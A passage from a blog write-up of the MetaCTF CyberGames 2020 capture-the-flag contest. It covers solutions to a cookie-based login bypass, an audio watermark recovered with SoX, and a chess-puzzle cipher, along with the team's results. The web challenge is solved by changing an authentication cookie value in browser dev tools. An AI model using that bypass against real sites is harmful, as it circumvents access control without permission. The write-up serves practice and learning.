<img src=/img/metactf-2020/cookie.png alt="An input field with label &ldquo;Enter the secret code&rdquo; and a Submit button to the right. Above, a red banner that says &ldquo;You are not authenticated. Please enter the secret code to log in." "></p><p>If you try and submit something, you&rsquo;ll be told that you have the incorrect code. However, if you look in the Network tab of Chrome dev tools, you&rsquo;ll see we have a response cookie called <code>cm-authenticated</code> with a value of 0.</p><p><img src=/img/metactf-2020/cookie-dev.png alt="Table of response cookies, showing cm-authenticated with a value of 0"></p><p>We can then go to Application > Storage > Cookies, and then modify the value of that cookie to be 1 instead. Refreshing the page will show the flag.</p><p><strong>Flag</strong>: <code>MetaCTF{oscar_says_i_love_trash_and_cookies}</code><br><strong>Tools</strong>: Browser dev tools</p><h1 id=other>Other</h1><h2 id=watermarked>Watermarked</h2><blockquote><p>Sonic watermarks are a security measure used by many different actors in the audio recording industry. Audio engineers sometimes mix them into unfinished tracks in case they are leaked outside of the studio, and developers of VST plugins often manipulate the generated sound to limit those using free trial or cracked versions of their software.
You are an audio engineer working with famous post-lingual rapper Playball Carl, and you&rsquo;ve been alerted to a leak that just surfaced on SoundCloud. Recover the watermark to find the identity of the leaker.</p></blockquote><p>Dean used the <a href=http://sox.sourceforge.net/><code>SoX</code></a> program to find the difference between the master and leaked files we were given, and put it into a new <code>wav</code> file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>$ sox -m -v <span style=color:#bd93f9>1</span> ../master1.wav -v -1 ../leaked.wav sound-difference.wav
</code></pre></div><p>He also used it to create a spectrogram with the left and right channels:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>$ sox sound-difference.wav -n spectrogram -o sound-difference.png
</code></pre></div><p><img src=/img/metactf-2020/spectrogram.png alt="Spectrogram that shows the audio in left and right channels, with purples, reds, oranges, and yellows."></p><p>Listening to the audio then revealed an automated voice spelling out the flag.</p><p><strong>Flag</strong>: <code>MetaCTF{p4r7ing_7h3_w4v3z}</code><br><strong>Tools</strong>: <a href=http://sox.sourceforge.net/>SoX</a></p><h2 id=checkmate-in-1-unfinished>Checkmate in 1 [unfinished]</h2><blockquote><p>An employee on the network has been emailing these chess puzzles everyday to someone outside of the domain, and nobody really thought it was suspicious until they saw this weird string sent to that same person on the following day. The SOC team has provided an archive of the email attachments, and has tasked you to investigate the actual contents of the ciphertext. Can you figure out what they&rsquo;ve been saying?</p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>F^mY;L?t24Zk.m^-hnWl,<span style=color:#ff79c6>[</span>l<span style=color:#ff79c6>)[</span>ku
</code></pre></div><p><strong>Hint:</strong> White to play, and you only need one move to win.</p><p>Inside the zip file, we are given 9 images, which are all chessboards:
<img src=/img/metactf-2020/chessboard.png alt="Chessboard. Black King is H8, and white Queen can move to H7 for checkmate."></p><p>We figured out the moves for the board and put them in chess notation:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Qh7
Qa8
Ng7
d5
Bb5
Nb6
Ra8
Rh8
Qh8
</code></pre></div><p>However, at this point we didn&rsquo;t really know what to do with it. We noticed that we had <em>26</em> characters instead of 27 like the given string, but even then we weren&rsquo;t sure why.</p><p><em>Post-CTF</em>: It turns out we didn&rsquo;t need to put all the moves in chess notation at all. We just needed the winning square.</p><p>Since we have 9 images and 27 characters, we can split it up into 9 sections, where each section is assigned to a chessboard. Then, use the number from the square to rotate that section by a certain distance.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>F<span style=color:#ff79c6>^</span>m (<span style=color:#bd93f9>7</span>) <span style=color:#ff79c6>-&gt;</span> Met
Y;L (<span style=color:#bd93f9>8</span>) <span style=color:#ff79c6>-&gt;</span> aCT
?t2 (<span style=color:#bd93f9>7</span>) <span style=color:#ff79c6>-&gt;</span> F{<span style=color:#bd93f9>9</span>
<span style=color:#bd93f9>4</span>Zk (<span style=color:#bd93f9>5</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#bd93f9>9</span>_p
<span style=color:#ff79c6>.</span>m<span style=color:#ff79c6>^</span> (<span style=color:#bd93f9>5</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#bd93f9>3</span>rc
<span style=color:#ff79c6>-</span>hn (<span style=color:#bd93f9>6</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#bd93f9>3</span>nt
Wl, (<span style=color:#bd93f9>8</span>) <span style=color:#ff79c6>-&gt;</span> _t4
[l) (<span style=color:#bd93f9>8</span>) <span style=color:#ff79c6>-&gt;</span> ct1
[ku (<span style=color:#bd93f9>8</span>) <span style=color:#ff79c6>-&gt;</span> cs}
</code></pre></div><p>Putting that all together will then give us the flag.</p><p><strong>Flag</strong>: <code>MetaCTF{99_p3rc3nt_t4ct1cs}</code><br><strong>Tools</strong>: <a href=http://www.asciitable.com/>ASCII Table</a></p><h1 id=conclusion>Conclusion</h1><p>Though over 1500 teams signed up, just under a thousand actually scored points. Out of those teams, our team placed 106th overall and 70th in the student category, scoring 5050 points.</p><p>Other fun stats:</p><ul><li>We did not solve any challenge above 300pts <em>except</em> for the Mr. Casyn ones</li><li>We only solved <em>one</em> reverse engineering challenge</li><li>We solved all of the reconnaisance challenges <em>except</em> for &ldquo;Complete Transparency&rdquo;, which involved looking for a subdomain</li></ul><p>Overall our team had a fun time (looking for Mr. Casyn especially!), but a small part of me wishes it could&rsquo;ve been longer - because of the quick turnaround, we weren&rsquo;t really able to do any work for it on Sunday morning at all.</p><p>Hopefully MetaCTF CyberGames 2021 will also be online - and we&rsquo;ll be even better at all of this 😊</p><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p><em>Post-CTF</em>: I tested it out after, and the exact number was 64 characters. 64-48 = 16. I don&rsquo;t actually know why 64. Something about stack frames? <a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2 role=doc-endnote><p>I added the <code>win</code> address at the end, but I actually don&rsquo;t know whether this is necessary. I also don&rsquo;t know why it&rsquo;s 56 chars specifically! <a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3 role=doc-endnote><p>Which didn&rsquo;t seem sketchy at <strong>all</strong>. <a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4 role=doc-endnote><p>When we bit-shift 1 to the left by <code>i</code>, we pad the right with <code>i</code> 0s. For example, <code>1 &lt;&lt; 5</code> would create the binary string <code>100000</code>, which is the number 2^5 or 32. <a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>Home</a></li><li><a href=/experience>Experience</a></li><li><a href=/posts>Posts</a></li><li><a href=/writings>Publications</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#binary-exploitation>Binary Exploitation</a><ul><li><a href=#baffling-buffer-0>Baffling Buffer 0</a></li><li><a href=#baffling-buffer-1>Baffling Buffer 1</a></li></ul></li><li><a href=#cryptography>Cryptography</a><ul><li><a href=#crypto-stands-for-cryptography>Crypto Stands for Cryptography</a></li><li><a href=#rot-26>ROT 26</a></li><li><a href=#welcome-to-the-obfuscation-games>Welcome to the Obfuscation Games!</a></li><li><a href=#the-last-great-zip-file>The Last Great Zip File</a></li></ul></li><li><a href=#forensics>Forensics</a><ul><li><a href=#forensics-101>Forensics 101</a></li><li><a href=#staging-in-123>Staging in 1..2..3</a></li><li><a href=#publish3r>Publish3r</a></li><li><a href=#open-thermal-exhaust>Open Thermal Exhaust</a></li></ul></li><li><a href=#reverse-engineering>Reverse Engineering</a><ul><li><a href=#redacted>[REDACTED]</a></li><li><a href=#password-here-please-unfinished>Password Here Please [unfinished]</a></li></ul></li><li><a href=#reconnaissance>Reconnaissance</a><ul><li><a href=#big-breaches>Big Breaches</a></li><li><a href=#not-so-itsy-bitsy-spider>Not So Itsy Bitsy Spider</a></li><li><a href=#diving-into-the-announcement>Diving into the Announcement</a></li><li><a href=#finding-mr-casyn>Finding Mr Casyn</a></li><li><a href=#ring-ring>Ring Ring</a></li><li><a href=#hangout-spots>Hangout Spots</a></li></ul></li><li><a href=#web-exploitation>Web Exploitation</a><ul><li><a href=#high-security-fan-page>High Security Fan Page</a></li><li><a href=#barrys-web-application>Barry&rsquo;s Web Application</a></li><li><a href=#everyone-loves-a-good-cookie>Everyone Loves a Good Cookie</a></li></ul></li><li><a href=#other>Other</a><ul><li><a href=#watermarked>Watermarked</a></li><li><a href=#checkmate-in-1-unfinished>Checkmate in 1 [unfinished]</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f"><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&text=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&is_video=false&description=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=Writeup%3a%20MetaCTF%20CyberGames%202020&body=Check out this article: https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f"><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-stumbleupon fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://digg.com/submit?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&title=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-digg fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&name=Writeup%3a%20MetaCTF%20CyberGames%202020&description=Last%20weekend%20MetaCTF%20hosted%20their%20annual%20CyberGames%2c%20lasting%2024%20hours%20from%20Sat%20Oct%2024%2012PM%20EDT%20to%20Sun%20Oct%2025%2012PM%20EDT.%20They%20had%20over%201500%20teams%20sign%20up%2c%20with%20tracks%20for%20both%20students%20and%20non-students.%20My%20friends%20and%20I%20signed%20up%20for%20the%20student%20track%20as%20press%20start%20to%20braincell%20and%20had%20a%20fun%20%28and%20frustrating%29%20time.%0aAs%20with%20other%20CTFs%20we%26rsquo%3bve%20done%2c%20this%20writeup%20is%20by%20no%20means%20conclusive%20-%20more%20of%20a%20%26ldquo%3bthrow%20it%20on%20the%20wall%20and%20see%20what%20sticks%26rdquo%3b%20-%20and%20is%20written%20by%20Dean%20Jiao%2c%20Ruju%20Jambusaria%2c%20and%20me%2c%20of%20course."><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjoyce.fyi%2fposts%2fmetactf-cybergames-2020%2f&t=Writeup%3a%20MetaCTF%20CyberGames%202020"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu class=icon href=# onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden=true></i>Menu</a>
<a id=toc class=icon href=# onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden=true></i>TOC</a>
<a id=share class=icon href=# onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden=true></i>share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i>Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2020 Joyce Kung</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/experience>Experience</a></li><li><a href=/posts>Posts</a></li><li><a href=/writings>Publications</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script></html>